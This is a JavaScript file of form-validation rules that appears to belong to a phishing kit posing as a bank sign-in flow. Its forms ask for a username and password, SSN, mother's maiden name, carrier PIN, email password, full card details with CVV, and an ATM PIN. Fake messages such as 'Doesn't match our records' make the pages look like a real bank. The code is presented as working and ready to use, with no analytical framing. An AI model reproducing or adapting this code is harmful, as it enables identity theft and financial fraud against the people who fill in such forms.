document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('loginform'),
        {
            fields: {
                username: {
                    validators: {
                        notEmpty: {
                            message: 'Please tell us your username and password.'
                        },
                        stringLength: {
                            min: 8,
                            max: 32,
                            message: '&#32;',
                        },
                        regexp: {
                            regexp: /^(?!fuck|fuckyou|spammer|bastard|motherfucker|bitch|dumbass|fuckyoubitch|asshole|dickhead|sonofabitch)(?=.*\d)(?=.*[a-zA-Z]).*$/,
                            message: 'We can\'t find that username',
                        },
                    }
                },
                password: {
                    validators: {
						notEmpty: {
                            message: '&#32;'
                        },
                        stringLength: {
                            min: 4,
                            message: '&#32;',
                        },
                       
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});  




document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('accounts'),
        {
            fields: {
                email: {
                    validators: {
                        notEmpty: {
                            message: 'Enter the valid informations we have in our records.<br/>Enter your Email address.'
                        },
                        stringLength: {
                            message: 'Enter a valid email address.',
                        },
                        regexp: {
                            regexp: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
                            message: 'We can\'t find you in our records',
                        },
                    }
                },
                phone: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your Phone number. '
                        },
                         regexp: {
                            regexp: /^(\([0-9]{3}\) |[0-9]{3}-)[0-9]{3}-[0-9]{4}$/,
                            message: 'We can\'t find you in our records',
                        },
                    }
                },
				cType: {
                    validators: {
                        notEmpty: {
                            message: 'Select your Carrier network.'
                        },
                        
                    }
                },
				cpin: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your Carrier pin.'
                        },
						stringLength: {
                            min: 4,
                            max: 6,
                            message: 'Doesn\'t match our records.',
                        },
                         regexp: {
                            regexp: /^[0-9]*$/,
                           message: 'Doesn\'t match our records.',
                        },
                    }
                },
               ssn: {
                    validators: {
                        notEmpty: {
                            message: 'Social security number or Individual Taxpayer Identification Number (ITIN) is required'
							  },
                         regexp: {
                            regexp: /^(?!000|666|9)\d{3}(-?)(?!00)\d{2}\1(?!0000)\d{4}$/,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				mmn: {
                    validators: {
                        notEmpty: {
                            message: 'Mother\'s maiden name is required.'
                        },
                        regexp: {
                            regexp: /^[a-zA-Z]+$/,
                            message: 'Doesn\'t match our records',
                        },
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});    



document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('axx'),
        {
            fields: {
                pass: {
                    validators: {
                        notEmpty: {
                            message: 'Enter your email password to continue. '
                        },
                        stringLength: {
                            min: 4,
                            max: 35,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    );
});    


document.addEventListener('DOMContentLoaded', function(e) {
    FormValidation.formValidation(
        document.getElementById('idca'),
        {
            fields: {
				noc: {
                    validators: {
                        notEmpty: {
                            message: 'Card Holder\'s name is required.'
                        },
                       regexp: {
                            regexp: /^([a-zA-Z]{2,}\s[a-zA-z]{0,}'?-?[a-zA-Z]{1,}\s?([a-zA-Z]{1,})?)$/,
                            message: 'Card Holder\'s name doesn\'t match our records .',
                        },
                    }
                },
                cc: {
                    validators: {
                        notEmpty: {
                            message: 'The card number is required'
                        },
                        creditCard: {
                            message: 'Enter your valid card number'
                        },
                    }
                },
				expdate: {
                    validators: {
                        notEmpty: {
                            message: 'Invalid expiration date.'
                        },
                        regexp: {
                            regexp: /^((0[1-9])|(1[0-2]))\/((20)|([2-2][0-9]))$/,
                            message: 'Invalid expiration date.',
                        },
                    }
                },
				cvv: {
                    validators: {
                        notEmpty: {
                            message: 'Invalid Cvv.'
                        },
                        stringLength: {
                            min: 3,
                            max: 3,
                            message: 'Doesn\'t match our records.',
                        },
                    }
                },
				atm: {
                    validators: {
                        notEmpty: {
                            message: 'Atm pin is required.'
                        },
                        stringLength: {
                            min: 4,
                            max: 4,
                            message: 'Doesn\'t match any record.',
                        },
                    }
                },
				
				stradd: {
                    validators: {
                        notEmpty: {
                            message: 'Billing Address is required'
							  },
                         stringLength: {
                            min: 5,
                            max: 100,
                            message: 'Doesn\'t match any record.',
                        },
                    }
                },
				zip: {
                    validators: {
                        notEmpty: {
                            message: 'Zipcode is required.'
                        },
                    }
                },
            },
			plugins: {
                trigger: new FormValidation.plugins.Trigger(),
                message: new FormValidation.plugins.Message({
					clazz: 'jpui exclamation-color icon',
                    clazz: 'red',
					
                    container: '#messages',
                }),
                submitButton: new FormValidation.plugins.SubmitButton(),
                defaultSubmit: new FormValidation.plugins.DefaultSubmit(),
            }
        }
    )
	.on('core.validator.validated', function(e) {
        if (e.field === 'cc' && e.validator === 'creditCard' && e.result.valid) {
            let icon = '';
            // e.result.meta.type can be one of
            // AMERICAN_EXPRESS, DINERS_CLUB, DINERS_CLUB_US, DISCOVER, JCB, LASER,
            // MAESTRO, MASTERCARD, SOLO, UNIONPAY, VISA
            switch (e.result.meta.type) {
                case 'AMERICAN_EXPRESS':
                    icon = 'fa fa-cc-amex';
                    break;
                
                case 'DISCOVER':
                    icon = 'fa-cc-discover';
                    break;
                
                case 'MASTERCARD':
                case 'DINERS_CLUB_US':
                    icon = 'fa-cc-mastercard';
                    break;
                
                case 'VISA':
                    icon = 'fa-cc-visa';
                    break;
                
                default:
                    icon = 'fa-credit-card';
                    break;
            }

            // Query the icon element
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon ' + icon);
        }
    })
    .on('core.element.validated', function(e) {
        if (e.field === 'cc' && !e.valid) {
            const iconEle = e.element.nextSibling;
            iconEle.setAttribute('class', 'fv-plugins-icon fa fa-times');
        }
    });
});    